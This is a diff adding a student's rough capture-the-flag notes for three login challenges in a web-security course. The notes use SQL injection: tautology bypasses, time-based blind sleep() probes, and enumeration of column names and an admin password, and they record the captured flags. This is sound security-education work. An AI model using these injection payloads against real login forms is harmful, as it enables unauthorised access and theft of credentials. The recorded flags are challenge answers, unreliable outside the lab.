@@ -1,0 +1,51 @@
+
+
+Try " then ' got server error
+
+then tried ' OR 1=1 -- test
+
+COMP6443{v1_z5636887_RONfg05SdHOvo3xFU3jZ}
+
+
+Login2
+
+' OR 1=1 -- test, filters out the OR I think
+
+1' + (SELECT sleep(3) from users) -- test
+Table name is users since user did not hang
+We did ' || 1=1 -- test 
+it worked lol
+COMP6443{v2_z5636887_QdNOcmmkyglIUPHiR5cw}
+
+Login 3
+
+' || 1=1 -- test 
+now says disabled guest logins, assume this means I actually have to match to a real login name
+' + (SELECT sleep(3) from users) -- test
+' + (SELECT sleep(3) from users WHERE ) -- test
+
+First need to enumerate the column names
+
+' + (SELECT IF (SUBSTR(SELECT username FROM users LIMIT 1, 1, 1)='a',sleep(5),1)) -- test
+
+SELECT username, password FROM users WHERE username = " " " and password = " "
+' || 1=1 
+
+' + (SELECT IF((SELECT username FROM users LIMIT 1),sleep(5),1)) '
+
+' + (SELECT password FROM users LIMIT 1 OFFSET 1) -- c
+' + (SELECT password FROM users LIMIT 1 OFFSET 2) OR 1=1-- c worked so must just be first account disabled?
+
+must be WHERE password = "" and username = ""
+
+' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1),1,1)='u' ,sleep(3),1))-- c
+this worked and I enumerated the column name as username
+
+Enumerated this part of the table
+
+UID | USERNAME | PASSWORD           |
+        GUEST
+        ADMIN   RKIGRJMGKLSADXCVVE
+
+The password was in clear text, I used it to login and got the flag
+COMP6443{v3_z5636887_RhjA_8psasNLcd-DX9Bs}
